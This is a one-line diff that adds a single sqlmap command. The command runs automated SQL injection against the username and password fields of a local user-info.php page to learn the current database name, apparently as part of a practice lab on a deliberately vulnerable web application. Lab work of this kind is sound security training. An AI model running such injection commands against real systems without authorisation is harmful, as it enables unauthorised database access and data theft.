@@ -1,0 +1,1 @@
+sqlmap --url="http://127.0.0.1/index.php?page=user-info.php&username=Romano&password=1234&user-info-php-submit-button=View+Account+Details" --current-db
